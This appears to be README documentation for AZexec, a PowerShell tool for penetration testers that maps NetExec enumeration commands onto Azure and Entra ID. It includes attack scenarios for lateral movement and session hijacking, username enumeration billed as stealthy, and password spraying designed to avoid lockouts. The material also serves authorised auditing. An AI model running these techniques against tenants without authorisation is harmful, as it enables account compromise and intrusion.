For penetration testers familiar with NetExec's `--loggedon-users` flag, the `vm-loggedon` command provides the **Azure cloud equivalent** of Workstation Service (wkssvc) enumeration.

**Now with Intune support!** The command enumerates:
1. **Intune-managed devices** - Shows primary user assigned to each Windows device (via Graph API)
2. **Azure VMs** - Shows currently logged-on users via VM Run Command (like NetExec)

### On-Premises vs Azure: Technical Comparison

| Aspect | On-Premises (NetExec) | Azure (AZexec) |
|--------|----------------------|----------------|
| **Command** | `nxc smb 192.168.1.0/24 -u User -p Pass --loggedon-users` | `.\azx.ps1 vm-loggedon` |
| **Protocol** | SMB/RPC (port 445) | Azure Management API (HTTPS/443) |
| **RPC Interface** | Workstation Service (wkssvc) | Azure VM Run Command API |
| **API Call** | `NetWkstaUserEnum` | `Invoke-AzVMRunCommand` |
| **Query Method** | Remote registry / RPC enumeration | Direct OS query via Run Command |
| **Windows Query** | Registry keys / RPC calls | `quser` command (Terminal Services) |
| **Linux Query** | N/A (Windows-only) | `who` command (wtmp/utmp) |
| **Authentication** | Domain/local credentials | Azure RBAC (OAuth2 token) |
| **Permissions** | Local admin or specific RPC rights | VM Contributor or VM Command Executor role |
| **Network Access** | Direct network connectivity required | No network access needed (cloud API) |
| **Speed** | Instant (network latency only) | 5-30 seconds per VM (API processing) |
| **Stealth** | Medium (SMB/RPC traffic) | Low (legitimate Azure API calls) |

### What Information Is Retrieved?

Both methods enumerate the same core information about logged-on users:

| Information | On-Premises (wkssvc) | Azure (vm-loggedon) | Security Value |
|-------------|---------------------|---------------------|----------------|
| **Username** | ✅ Via NetWkstaUserEnum | ✅ Via quser/who | Identify active accounts |
| **Session Type** | ✅ Console/RDP/Network | ✅ Console/RDP/TTY/PTS | Determine connection method |
| **Session State** | ✅ Active/Disconnected | ✅ Active/Disconnected/Idle | Current session status |
| **Idle Time** | ✅ Via registry | ✅ Via quser (Windows) | Detect stale sessions |
| **Logon Time** | ✅ Via registry | ⚠️ Limited | Session duration |
| **Source IP/Host** | ⚠️ Limited | ✅ Via who (Linux) | Track connection origin |
| **VM/Host Name** | ✅ Target hostname | ✅ Azure VM name | Identify target system |
| **Resource Group** | ❌ N/A | ✅ Azure resource group | Cloud organization |
| **Subscription** | ❌ N/A | ✅ Azure subscription | Multi-tenant support |

### Usage Examples

**On-Premises with NetExec:**
```bash
# Enumerate logged-on users on a subnet
nxc smb 192.168.1.0/24 -u Administrator -p 'Password123!' --loggedon-users

# Target specific host
nxc smb 192.168.1.50 -u UserName -p 'PASSWORDHERE' --loggedon-users username
```

**Azure with AZexec:**
```powershell
# Enumerate logged-on users across all VMs
.\azx.ps1 vm-loggedon

# Target specific resource group (like targeting a subnet)
.\azx.ps1 vm-loggedon -ResourceGroup Production-RG

# Filter to running VMs only (like filtering responsive hosts)
.\azx.ps1 vm-loggedon -VMFilter running

# Multi-subscription enumeration (like scanning multiple networks)
.\azx.ps1 vm-loggedon  # Automatically scans all accessible subscriptions
```

### Attack Scenarios

**Scenario 1: Privileged Account Discovery**
```powershell
# Find where domain admins or privileged accounts are logged in
.\azx.ps1 vm-loggedon -ExportPath loggedon.csv
# Then filter CSV for admin accounts: admin, administrator, root, etc.
```

**Scenario 2: Lateral Movement Planning**
```powershell
# Identify users logged into multiple VMs (potential lateral movement targets)
.\azx.ps1 vm-loggedon -ExportPath users.json
# Analyze JSON to find users with sessions on multiple systems
```

**Scenario 3: Session Hijacking Preparation**
```powershell
# Find disconnected RDP sessions (potential targets for session hijacking)
.\azx.ps1 vm-loggedon | Where-Object { $_.State -eq "Disconnected" }
```

**Scenario 4: Incident Response**
```powershell
# During IR, quickly identify all active sessions across the environment
.\azx.ps1 vm-loggedon -VMFilter running -ExportPath incident-sessions.csv

# Cross-reference with Azure AD sign-in logs
.\azx.ps1 sessions -Hours 24 -ExportPath signin-logs.csv
```

### Why Use VM Run Command Instead of wkssvc?

Azure doesn't expose traditional Windows RPC interfaces like wkssvc to the internet. Instead, Azure provides the **VM Run Command** feature, which:

1. **More Powerful**: Can execute arbitrary commands, not just enumerate users
2. **Cross-Platform**: Works on both Windows and Linux VMs
3. **Cloud-Native**: Designed for Azure's security model (RBAC instead of NTLM)
4. **Auditable**: All Run Command executions are logged in Azure Activity Logs
5. **No Network Access Required**: Works even if VMs are in private VNets

### Limitations Compared to On-Premises

| Limitation | Impact | Workaround |
|------------|--------|------------|
| **Slower** | 5-30 seconds per VM vs instant | Use `-VMFilter running` to skip stopped VMs |
| **Requires Azure Auth** | Can't do anonymous enumeration | Must have valid Azure credentials |
| **VM Agent Required** | VMs without agent can't be queried | Ensure Azure VM Agent is installed |
| **API Rate Limits** | May hit throttling on large environments | Process in batches or add delays |
| **No Stealth** | All actions logged in Azure Activity Logs | This is a feature, not a bug (compliance) |

### Integration with Other AZexec Commands

The `vm-loggedon` command works best when combined with other enumeration commands:

```powershell
# Step 1: Enumerate directory roles to identify privileged accounts
.\azx.ps1 roles -ExportPath roles.csv

# Step 2: Find where those privileged accounts are logged in
.\azx.ps1 vm-loggedon -ExportPath vm-sessions.csv

# Step 3: Check Azure AD sign-in logs for those accounts
.\azx.ps1 sessions -Hours 24 -ExportPath signin-logs.csv

# Step 4: Correlate data to map privileged account activity
# (Analyze CSV files to find privileged users with active VM sessions)
```

---

## ☁️ Azure Resource Manager Enumeration (Multi-Subscription)

AZexec includes ARM-based enumeration commands that support **automatic multi-subscription discovery**. These commands use Azure Resource Manager API instead of Microsoft Graph.

### Storage Account Enumeration: `storage-enum`

Discover Azure Storage Accounts with security analysis across all subscriptions:

```powershell
# Enumerate storage accounts across ALL accessible subscriptions
.\azx.ps1 storage-enum

# Target a specific subscription
.\azx.ps1 storage-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"

# Filter by resource group
.\azx.ps1 storage-enum -ResourceGroup Production-RG

# Export to CSV/JSON/HTML
.\azx.ps1 storage-enum -ExportPath storage-audit.html
```

**Security Analysis Includes**:
| Check | Risk Level | Description |
|-------|-----------|-------------|
| Blob Public Access | HIGH | Identifies storage accounts allowing public blob access |
| HTTPS-Only | MEDIUM | Detects storage accounts not requiring HTTPS |
| TLS Version | LOW | Checks for TLS < 1.2 |
| Network Default Action | MEDIUM | Identifies storage accounts allowing all network access |
| Shared Key Access | LOW | Detects shared key access (vs Azure AD auth) |

### Key Vault Enumeration: `keyvault-enum`

Discover Azure Key Vaults with security configuration analysis:

```powershell
# Enumerate Key Vaults across ALL accessible subscriptions
.\azx.ps1 keyvault-enum

# Target specific subscription with JSON export
.\azx.ps1 keyvault-enum -SubscriptionId "12345678-1234-1234-1234-123456789012" -ExportPath keyvaults.json

# Filter by resource group with HTML report
.\azx.ps1 keyvault-enum -ResourceGroup Security-RG -ExportPath keyvault-audit.html
```

**Security Analysis Includes**:
| Check | Risk Level | Description |
|-------|-----------|-------------|
| Soft Delete | MEDIUM | Identifies Key Vaults without soft delete protection |
| Purge Protection | LOW | Detects Key Vaults without purge protection |
| RBAC Authorization | LOW | Identifies Key Vaults using access policies instead of RBAC |
| Network Default Action | MEDIUM | Detects Key Vaults allowing public network access |
| Access Policy Count | INFO | Flags Key Vaults with many access policies (>10) |

### Network Resource Enumeration: `network-enum`

Discover Azure Network resources with security analysis:

```powershell
# Enumerate network resources across ALL accessible subscriptions
.\azx.ps1 network-enum

# Target specific subscription
.\azx.ps1 network-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"

# Filter by resource group with CSV export
.\azx.ps1 network-enum -ResourceGroup Prod-RG -ExportPath network-audit.csv
```

**Resources Enumerated**:
- **Virtual Networks (VNets)**: Address spaces, subnets, peerings
- **Network Security Groups (NSGs)**: Security rules, risky inbound rules
- **Public IP Addresses**: Allocation, association status
- **Load Balancers**: Frontend IPs, backend pools, rules
- **Network Interfaces (NICs)**: IP configurations, VM attachments, NSG associations, MAC addresses

**Security Analysis Includes**:
| Check | Risk Level | Description |
|-------|-----------|-------------|
| Risky NSG Inbound Rules | HIGH | Open ports (22, 3389, 445, etc.) from Internet/Any |
| Unassociated Public IPs | MEDIUM | Public IPs not associated with any resource |
| Unattached Network Interfaces | MEDIUM | NICs not attached to VMs (billable, potential misconfiguration) |
| NICs with Public IP but No NSG | HIGH | Network interfaces exposed to internet without security group |
| IP Forwarding Enabled | MEDIUM | NICs configured for routing/firewall capabilities |

**Network Interface Details Displayed**:
- **VM Attachment**: Shows which VM the NIC is attached to (or "Not Attached")
- **Private IP Addresses**: All private IPs configured on the NIC
- **Public IP Addresses**: Any public IPs associated with the NIC
- **NSG Association**: Network Security Group protecting the NIC (or "None")
- **IP Forwarding**: Whether the NIC can forward packets (routing capability)
- **Accelerated Networking**: SR-IOV performance feature status
- **MAC Address**: Hardware address (allocated when attached to VM)
- **Risk Assessment**: Automatic security risk evaluation

**NetExec Equivalent**: This is similar to `nxc smb --enum-network-interfaces` which enumerates network adapters on Windows systems via RPC. In Azure, we enumerate the cloud-level network interface resources instead of querying individual VMs.

**Usage Examples**:

```powershell
# Enumerate all network interfaces across all subscriptions
.\azx.ps1 network-enum

# Find unattached NICs (cost optimization opportunity)
.\azx.ps1 network-enum -ExportPath nics.csv
# Then filter CSV for ResourceType="NetworkInterface" and Details containing "Not Attached"

# Identify NICs with public IPs but no NSG (HIGH RISK)
.\azx.ps1 network-enum | Select-String "Public IP" | Select-String "NSG: None"

# Target specific resource group
.\azx.ps1 network-enum -ResourceGroup Production-RG
```

**Security Use Cases**:
1. **Attack Surface Mapping**: Identify all network interfaces with public IPs
2. **Lateral Movement Planning**: Map private IP ranges and network topology
3. **Cost Optimization**: Find unattached NICs that are still billable
4. **Compliance Auditing**: Verify all NICs have proper NSG associations
5. **IP Forwarding Detection**: Identify NICs configured for routing (potential pivot points)

### Azure File Shares Enumeration: `shares-enum`

The Azure equivalent of NetExec's `--shares` command. Enumerate Azure File Shares with access permission analysis:

```powershell
# Enumerate file shares across ALL accessible subscriptions (like nxc smb --shares)
.\azx.ps1 shares-enum

# Filter by access level (like nxc smb --shares READ,WRITE)
.\azx.ps1 shares-enum -SharesFilter READ,WRITE
.\azx.ps1 shares-enum -SharesFilter WRITE
.\azx.ps1 shares-enum -SharesFilter READ

# Target specific subscription or resource group
.\azx.ps1 shares-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
.\azx.ps1 shares-enum -ResourceGroup Production-RG -ExportPath shares.csv
```

**Information Enumerated**:
| Information | Description | Security Value |
|-------------|-------------|----------------|
| **Share Name** | Azure File Share name | Identify potential data stores |
| **Access Level** | READ, WRITE, or READ,WRITE | Determine exploitation potential |
| **Quota** | Storage quota in GB | Assess storage capacity |
| **Access Tier** | Hot, Cool, Transaction Optimized | Cost/performance profile |
| **Protocol** | SMB or NFS | Protocol-specific attack vectors |
| **Storage Account** | Parent storage account | Scope of access |
| **Public Network Access** | Whether publicly accessible | Exposure risk |

**NetExec Comparison**:
| NetExec Command | AZexec Equivalent | Description |
|-----------------|-------------------|-------------|
| `nxc smb 192.168.1.0/24 -u user -p 'PASS' --shares` | `.\azx.ps1 shares-enum` | List all accessible shares |
| `nxc smb 192.168.1.0/24 -u user -p 'PASS' --shares READ,WRITE` | `.\azx.ps1 shares-enum -SharesFilter READ,WRITE` | Filter writable shares |
| `nxc smb 192.168.1.0/24 -u user -p 'PASS' --shares READ` | `.\azx.ps1 shares-enum -SharesFilter READ` | Filter readable shares |
| `nxc smb 192.168.1.0/24 -u user -p 'PASS' --shares WRITE` | `.\azx.ps1 shares-enum -SharesFilter WRITE` | Filter write-only shares |

**Security Analysis**:
- Shares with WRITE access are highlighted in RED (potential data exfiltration/upload risk)
- Shares in publicly accessible storage accounts are flagged
- Protocol breakdown (SMB vs NFS) for attack planning
- Recommendations for securing file shares

### Azure Managed Disks Enumeration: `disks-enum`

The Azure equivalent of NetExec's `--disks` command. Enumerate Azure Managed Disks with encryption and security analysis:

```powershell
# Enumerate managed disks across ALL accessible subscriptions (like nxc smb --disks)
.\azx.ps1 disks-enum

# Target specific subscription or resource group
.\azx.ps1 disks-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
.\azx.ps1 disks-enum -ResourceGroup Production-RG -ExportPath disks.csv

# Export to JSON for detailed analysis
.\azx.ps1 disks-enum -ExportPath disks.json
```

**Information Enumerated**:
| Information | Description | Security Value |
|-------------|-------------|----------------|
| **Disk Name** | Azure Managed Disk name | Identify storage resources |
| **Size** | Disk capacity in GB | Assess data volume |
| **Disk Type** | OS Disk or Data Disk | Understand disk purpose |
| **State** | Attached or Unattached | Identify orphaned resources |
| **Encryption** | Platform/Customer/None | Encryption status |
| **SKU** | Premium_LRS, Standard_LRS, etc. | Performance tier |
| **Attached To** | VM name if attached | Ownership tracking |
| **Network Access** | Public or Private | Exposure risk |
| **OS Type** | Windows, Linux (for OS disks) | Operating system |

**NetExec Comparison**:
| NetExec Command | AZexec Equivalent | Description |
|-----------------|-------------------|-------------|
| `nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks` | `.\azx.ps1 disks-enum` | Enumerate all disks |
| NetExec enumerates local/network disks on remote hosts | AZexec enumerates Azure Managed Disks | Cloud vs On-Prem |

**Security Analysis**:
- Unencrypted disks are highlighted in RED (HIGH RISK - potential data exposure)
- Unattached disks are flagged in YELLOW (orphaned resources, potential sensitive data)
- Public network access is identified (exposure risk)
- Disk type breakdown (OS vs Data disks)
- Total storage capacity tracking
- Recommendations for encryption and cleanup

**Risk Levels**:
- **HIGH**: Unencrypted disks (data at rest not protected)
- **MEDIUM**: Public network access enabled, unattached disks
- **LOW**: Encrypted, attached disks with private access

### BitLocker Enumeration: `bitlocker-enum`

The Azure equivalent of NetExec's `-M bitlocker` module. Enumerate BitLocker encryption status on Windows Azure VMs:

```powershell
# Enumerate BitLocker status on all Windows VMs (like nxc smb -M bitlocker)
.\azx.ps1 bitlocker-enum

# Target specific subscription or resource group
.\azx.ps1 bitlocker-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
.\azx.ps1 bitlocker-enum -ResourceGroup Production-RG

# Filter by VM power state (default: running only)
.\azx.ps1 bitlocker-enum -VMFilter running
.\azx.ps1 bitlocker-enum -VMFilter all

# Export results to CSV/JSON
.\azx.ps1 bitlocker-enum -ExportPath bitlocker-status.csv
.\azx.ps1 bitlocker-enum -ExportPath bitlocker-status.json
```

**Information Enumerated**:
| Information | Description | Security Value |
|-------------|-------------|----------------|
| **Mount Point** | Drive letter (C:, D:, etc.) | Identify volumes |
| **Volume Status** | FullyEncrypted, FullyDecrypted, EncryptionInProgress | Encryption state |
| **Encryption %** | Percentage of volume encrypted (0-100%) | Encryption progress |
| **Encryption Method** | XTS-AES 128/256, AES-CBC 128/256 | Encryption algorithm |
| **Protection Status** | On/Off | BitLocker protection active |
| **Key Protector** | TPM, RecoveryPassword, etc. | Key protection method |
| **Capacity** | Volume size in GB | Storage capacity |
| **Lock Status** | Locked/Unlocked | Access status |

**NetExec Comparison**:
| NetExec Command | AZexec Equivalent | Description |
|-----------------|-------------------|-------------|
| `nxc smb 192.168.1.0/24 -u admin -p pass -M bitlocker` | `.\azx.ps1 bitlocker-enum` | Enumerate BitLocker status |
| NetExec queries via SMB/WMI on remote Windows hosts | AZexec queries via Intune API + Azure VM Run Command | Cloud vs On-Prem |

**How It Works**:

**Section 1: Intune-Managed Devices** (via Microsoft Graph API)
1. Connects to Microsoft Graph with `DeviceManagementManagedDevices.Read.All` permission
2. Queries all Windows devices enrolled in Intune
3. Checks the `isEncrypted` property for each device
4. Lists devices without BitLocker with specific device names

**Section 2: Azure VMs** (via ARM API)
1. **Discovery**: Enumerates all Windows VMs across subscriptions
2. **Filtering**: Targets running VMs by default (BitLocker query requires VM to be running)
3. **Query Execution**: Uses Azure VM Run Command to execute `Get-BitLockerVolume` on each VM
4. **Data Parsing**: Parses BitLocker status, encryption method, and key protectors
5. **Risk Assessment**: Identifies unencrypted volumes and disabled protection

**Security Analysis**:
- Unencrypted volumes are highlighted in RED (HIGH RISK)
- Volumes with protection disabled are flagged in YELLOW (MEDIUM RISK)
- Shows encryption method (strong: XTS-AES 256, weak: AES-CBC 128)
- Identifies key protector types (TPM, Password, Recovery Key)
- Tracks encryption progress for volumes being encrypted
- **Lists specific device names** for devices needing BitLocker
- Recommendations for enabling BitLocker and best practices

**Risk Levels**:
- **HIGH**: Volume not encrypted (data at rest exposed)
- **MEDIUM**: BitLocker protection disabled (encrypted but not protected)
- **LOW**: Fully encrypted with protection enabled

**Use Cases**:
1. **Compliance Auditing**: Verify all Windows VMs have BitLocker enabled
2. **Security Assessment**: Identify unencrypted volumes that should be encrypted
3. **Encryption Monitoring**: Track encryption progress across the environment
4. **Key Management**: Identify VMs using weak key protectors (password-only)
5. **Incident Response**: Quickly assess encryption status during security incidents

**Technical Details**:
- Requires VM to be in **running** state (stopped VMs cannot be queried)
- Uses Azure VM Run Command (same as `vm-loggedon` command)
- Requires **Virtual Machine Contributor** or **VM Command Executor** role
- Queries are logged in Azure Activity Logs (audit trail)
- Windows VMs only (BitLocker is Windows-specific)
- Linux VMs are automatically skipped

**Comparison with `disks-enum`**:
| Feature | `bitlocker-enum` | `disks-enum` |
|---------|------------------|--------------|
| **Target** | Running Windows VMs | Azure Managed Disks (storage layer) |
| **Encryption Type** | BitLocker (OS-level) | Azure Disk Encryption (platform-level) |
| **Query Method** | VM Run Command (active query) | Azure Resource Manager API (metadata) |
| **Requires Running VM** | Yes | No |
| **Information** | BitLocker status, encryption method, key protectors | Disk encryption type, attachment state, network access |
| **Use Case** | OS-level encryption compliance | Storage-level encryption audit |

**Integration Example**:
```powershell
# Complete disk security audit workflow
# Step 1: Check Azure Disk Encryption (storage layer)
.\azx.ps1 disks-enum -ExportPath disks.csv

# Step 2: Check BitLocker status (OS layer)
.\azx.ps1 bitlocker-enum -ExportPath bitlocker.csv

# Step 3: Compare results to ensure dual-layer encryption
# (Both Azure Disk Encryption AND BitLocker should be enabled for maximum security)
```

**NetExec Module Equivalence**:
This command is the direct Azure equivalent of NetExec's BitLocker module:
```bash
# NetExec (On-Premises)
nxc smb 192.168.1.0/24 -u administrator -p 'Password1' -M bitlocker

# AZexec (Azure)
.\azx.ps1 bitlocker-enum
```

Both commands provide the same information:
- Drive letters and mount points
- Encryption status and percentage
- Encryption method (algorithm)
- Protection status
- Key protector types

### Multi-Subscription Pattern

All ARM commands share a common multi-subscription enumeration pattern:

```powershell
# Automatic - Enumerate ALL accessible subscriptions
.\azx.ps1 storage-enum       # Scans all subscriptions automatically

# Targeted - Specific subscription
.\azx.ps1 keyvault-enum -SubscriptionId "12345678-..."

# Filtered - Specific resource group (applies within each subscription)
.\azx.ps1 network-enum -ResourceGroup Production-RG

# Combined - All options work together
.\azx.ps1 storage-enum -SubscriptionId "12345678-..." -ResourceGroup Prod-RG -ExportPath report.html
```

**Output Includes**:
- Subscription name and ID for each resource
- Resource group and location
- Security risk assessment
- Detailed security issues list

---

## 🎯 Features

- **Tenant Discovery**: Discover Azure/Entra ID tenant configuration without authentication (mimics `nxc smb --enum`)
  - Enumerate exposed application IDs and redirect URIs
  - Identify misconfigured public clients and OAuth settings
  - Detect implicit flow configurations and security risks
  - Access federation metadata for federated tenants
- **Username Enumeration**: Validate username existence without authentication using GetCredentialType API (mimics `nxc smb --users` unauthenticated)
  - Stealthy username validation (doesn't trigger auth logs)
  - No authentication required - perfect for external reconnaissance
  - Built-in common username lists
  - Export valid usernames for password spray attacks
  - **Enhanced v2.0**: Progress indicators, retry logic, adaptive rate limiting, detailed statistics
- **Password Spray Attacks**: ROPC-based credential testing (mimics `nxc smb -u users.txt -p 'Pass123'`)
  - Test single password against multiple users
  - Support for username:password file format
  - Automatic lockout detection and account status reporting
  - MFA detection (valid credentials even if MFA blocks)
  - **Two-phase attack**: First enumerate with GetCredentialType, then spray with ROPC
  - Smart delays to avoid account lockouts
- **Domain User Enumeration**: Comprehensive authenticated user enumeration (mimics `nxc smb/ldap <target> -u <user> -p <pass> --users`)
  - **Azure equivalent of NetExec's SMB/LDAP user enumeration**
  - Enumerate all users in Azure/Entra ID directory with full details
  - Display names, UPNs, job titles, departments, and office locations
  - User types (Member vs Guest) and account status (Enabled/Disabled)
  - Last sign-in activity tracking (if AuditLog.Read.All permission available)
  - Identify high-value targets (executives, admins, privileged accounts)
  - Export to CSV, JSON, or HTML for offline analysis and reporting
  - Color-coded output: Green (active members), Yellow (guests), Gray (disabled)
- **Device Enumeration**: Query and display all devices registered in Azure/Entra ID (mimics `nxc smb --hosts`)
- **Group Enumeration**: Enumerate all Azure AD groups with details (mimics `nxc smb --groups`)
  - Security groups, Microsoft 365 groups, distribution lists
  - Group types, membership counts, and descriptions
  - Dynamic group detection
- **Local Groups Enumeration**: Enumerate Azure AD Administrative Units (mimics `nxc smb --local-group`)
  - **Azure equivalent of local groups enumeration**
  - Administrative Units provide scoped administration (like local groups provide machine-scoped access)
  - Display membership types (Assigned vs Dynamic)
  - Show member counts and scoped role assignments
  - Identify privileged administrative boundaries (IT, Security, Executive)
  - Understand organizational delegation structure and regional/departmental scopes
  - Export to CSV, JSON, or HTML for offline analysis
  - Color-coded output: Red (privileged AUs), Yellow (dynamic), Green (active), Cyan (standard)
  - Requires Azure AD Premium P1/P2 licensing
- **Password Policy Enumeration**: Display password policies and security settings (mimics `nxc smb --pass-pol`)
  - **Azure AD Default Password Requirements**: Min/max length (8-256 chars), complexity (3 of 4 char types), banned password list
  - **Smart Lockout Settings**: Lockout threshold (10 attempts), duration (60s+), familiar location detection
  - **Password Expiration Policies**: Validity period, notification windows
  - **Authentication Methods**: MFA configuration (Authenticator, SMS, FIDO2, etc.)
  - **Security Defaults**: Baseline security enforcement (MFA, legacy auth blocking)
  - **Conditional Access Policies**: Summary of policies enforcing MFA, device compliance, location restrictions
  - **NetExec-Style Summary**: Formatted output similar to `nxc smb --pass-pol` with all key policy settings
  - **Azure AD vs On-Premises Comparison**: Side-by-side comparison table of password policy differences
- **Guest Login Enumeration**: Test guest/external authentication (mimics `nxc smb -u 'a' -p ''`)
  - Test if tenant accepts external/B2B authentication
  - Test credentials with empty/null passwords (like SMB null session)
  - Password spray with single password against user list
  - Detect MFA requirements, locked accounts, expired passwords
  - ROPC-based authentication testing
- **Guest User Enumeration**: Leverage guest accounts as "Azure null session" for low-noise reconnaissance
  - Exploit default guest permissions for directory enumeration
  - Modern equivalent of SMB null session attacks
  - Test for misconfigured guest access policies
- **Active Session Enumeration**: Query sign-in logs to enumerate active sessions (mimics `nxc smb --qwinsta`)
  - Query Azure AD sign-in audit logs
  - Display recent authentication events and active sessions
  - Show device information, location, IP address, and application used
  - Identify MFA status and risky sign-ins
  - Filter by username and export results
- **Azure VM Logged-On Users Enumeration**: Query logged-on users on Azure VMs (mimics `nxc smb --logged-on-users`)
  - Azure equivalent of Workstation Service (wkssvc) and Remote Registry Service enumeration
  - Query logged-on users on Windows and Linux Azure VMs
  - Uses Azure VM Run Command to execute queries remotely (similar to RPC/PsExec)
  - Display username, session state, idle time, and connection source
  - Filter by resource group, subscription, and VM power state
  - Multi-subscription support with automatic enumeration
  - Requires VM Contributor or VM Command Executor role
- **Vulnerable Target Enumeration**: Enumerate weak authentication configurations (mimics `nxc smb --gen-relay-list`)
  - Service principals with password-only credentials (like SMB hosts without signing)
  - Applications with public client flows enabled (ROPC vulnerable)
  - Tenants with legacy authentication not blocked
  - Security Defaults and Conditional Access gaps
  - Stale guest accounts and dangerous OAuth permissions
  - **Guest permission level check** (null session equivalent vulnerability)
  - **Users without MFA registered** (credential attack targets)
  - Guest invite policy configuration
  - Hybrid approach: unauthenticated checks + authenticated enumeration
- **Guest User Vulnerability Scanner**: Automated testing for guest enumeration vulnerabilities (mimics `nxc smb --check-null-session`)
  - Detect if external collaboration is enabled
  - Test guest permission boundaries
  - Generate security assessment report with risk scoring
  - Compare guest vs member access levels
  - Identify Azure "null session" equivalent vulnerabilities
  - Test actual guest permissions across Users, Groups, Devices, Applications, and Directory Roles
  - Provide actionable remediation recommendations
- **Application Enumeration**: List registered applications and service principals (authentication required)
  - Enumerate all application registrations in the tenant
  - List all service principals (SPNs)
  - Display credential types (password vs certificate-based authentication)
  - Identify public client applications (ROPC-enabled, vulnerable to password spray)
  - Security posture assessment with risk indicators
  - Export to CSV or JSON for offline analysis
- **Service Principal Discovery**: Discover service principals with detailed permissions and assignments (authentication required)
  - Enumerate service principals with their app role assignments (application permissions)
  - Display OAuth2 permission grants (delegated permissions)
  - Identify service principal owners and their access
  - Map resource permissions to service principals
  - Detect password-only credentials (security risk)
  - Identify high-risk permissions (RoleManagement, Application.ReadWrite, etc.)
  - Security posture assessment with risk scoring
  - Export detailed permission data to CSV or JSON
- **Role Assignments Enumeration**: List directory role assignments and privileged accounts (authentication required)
  - Enumerate all active directory roles and their members
  - Display role assignments for users, groups, and service principals
  - Identify privileged roles (Global Administrator, Privileged Role Administrator, etc.)
  - Show PIM (Privileged Identity Management) eligible assignments
  - Detect group-based role assignments
  - Security posture assessment for privileged access
  - Color-coded output highlighting high-risk privileged accounts
  - Export comprehensive role assignment data to CSV or JSON
- **Conditional Access Policy Review**: Review conditional access policies (member accounts only, requires Policy.Read.All)
  - Detailed conditional access policy enumeration
  - Policy state tracking (enabled, disabled, report-only)
  - Conditions analysis (users, apps, locations, platforms, risk levels)
  - Grant controls (MFA, compliant device, approved app, terms of use)
  - Session controls (sign-in frequency, persistent browser, app enforced restrictions)
  - Security posture assessment and risk identification
  - High-risk policy highlighting (block access, risk-based policies)
  - Export comprehensive policy data to CSV or JSON
- **Azure File Shares Enumeration**: Enumerate Azure File Shares with access permissions (mimics `nxc smb --shares`)
  - Azure equivalent of SMB share enumeration
  - Display access permissions (READ, WRITE) similar to NetExec
  - Filter by access level (READ, WRITE, READ,WRITE)
  - Show quotas, access tiers, and enabled protocols (SMB/NFS)
  - Security analysis for writable and publicly accessible shares
  - Multi-subscription support with automatic enumeration
- **Azure Managed Disks Enumeration**: Enumerate Azure Managed Disks with encryption status (mimics `nxc smb --disks`)
  - Azure equivalent of disk enumeration on remote hosts
  - Display disk encryption (Platform/Customer-Managed Keys)
  - Identify unattached disks (orphaned resources)
  - Track disk sizes, SKUs, and attachment status
  - Security analysis for unencrypted and publicly accessible disks
  - Multi-subscription support with automatic enumeration
- **BitLocker Enumeration**: Query BitLocker encryption status on Windows Azure VMs (mimics `nxc smb -M bitlocker`)
  - Azure equivalent of NetExec BitLocker module
  - Query BitLocker volume status via Azure VM Run Command
  - Display encryption percentage, method (XTS-AES 256/128), and protection status
  - Identify key protector types (TPM, Password, Recovery Key)
  - Security analysis for unencrypted volumes and disabled protection
  - Track encryption progress across all Windows VMs
  - Multi-subscription support with automatic enumeration
- **Anti-Virus & EDR Enumeration**: Enumerate security products on Azure/Entra devices (mimics `nxc smb -M enum_av`)
  - Azure equivalent of NetExec's enum_av module
  - Enumerate antivirus/antimalware products (Microsoft Defender, third-party AV) with **signature version**
  - Detect Microsoft Defender for Endpoint (MDE) onboarding status via **Windows Protection State API**
  - Query device compliance policies and security posture via Intune
  - Identify firewall status (enabled/disabled)
  - Display encryption status (**BitLocker** via `isEncrypted` property)
  - Security risk scoring (High/Medium/Low risk devices)
  - **Device-specific recommendations** - lists exact device names for each security issue
  - **Windows-specific filtering** - MDE/BitLocker recommendations only for Windows devices
  - Color-coded output: Green (secure), Yellow (warnings), Red (critical gaps)
  - Export detailed security reports to CSV, JSON, or HTML
- **Netexec-Style Output**: Familiar output format for penetration testers and security professionals
- **Advanced Filtering**: Filter devices by OS, trust type, compliance status, and more
- **Owner Information**: Optional device owner enumeration with additional API calls
- **Export Capabilities**: Export results to CSV, JSON, or **HTML** formats
- **Comprehensive HTML Reports**: Generate professional, netexec-styled HTML reports with dark theme
  - Interactive tables with color-coded risk indicators
  - Detailed statistics and summaries
  - Risk highlighting (High/Medium/Low)
  - Responsive design for any screen size
  - Perfect for documentation and reporting
- **Colored Output**: Color-coded output for better readability (can be disabled)
- **Automatic Authentication**: Handles Microsoft Graph API authentication seamlessly (for authenticated commands)
- **Auto-Disconnect**: Optional `-Disconnect` parameter to automatically disconnect from Microsoft Graph after execution
- **Built-in Help**: Use `.\azx.ps1 help` to display all available commands with authentication requirements
- **PowerShell 7 Compatible**: Modern PowerShell implementation

## 🎨 Visual Indicators & High-Risk Highlighting

AZexec uses an intelligent color-coding system to instantly identify security-critical items across all commands. High-risk and privileged items are highlighted in **RED** to ensure immediate visibility during enumeration.

### Universal Color Scheme

All commands follow this consistent color hierarchy:

| Color | Meaning | Examples |
|-------|---------|----------|
| 🔴 **Red** | **High-risk/Critical items** | Privileged roles, high-risk permissions, dangerous configurations, critical vulnerabilities |
| 🟡 **Yellow** | **Medium-risk/Warning items** | Password-only credentials, ROPC-enabled apps, disabled security features, medium vulnerabilities |
| 🟢 **Green** | **Normal/Valid items** | Standard security groups, certificate-based auth, compliant configurations, valid usernames |
| 🔵 **Cyan** | **Informational** | Standard users, basic information, general data |
| ⚪ **DarkGray** | **Disabled/Low-risk** | Disabled accounts, invalid usernames, inactive items |
| 🟣 **Magenta** | **Group assignments** | Group-based role assignments |

### Command-Specific High-Risk Highlighting

#### `sp-discovery` - Service Principal Discovery
**Red highlights:**
- Service principals with **high-risk permissions**:
  - `RoleManagement.ReadWrite.Directory` - Can modify directory roles
  - `AppRoleAssignment.ReadWrite.All` - Can assign app roles
  - `Application.ReadWrite.All` - Can modify all applications
  - `Directory.ReadWrite.All` - Full directory write access
- Individual permissions (both App Roles and OAuth2 delegated) that match high-risk permissions
- Makes it immediately obvious which SPNs pose privilege escalation risks

**Example output:**
```powershell
AZR         d1f5c8a3b7e...  443    Contoso-Admin-App            [*] (appId:...) (appRoles:5) (delegated:2)  # RED
    [+] Application Permissions (App Roles):
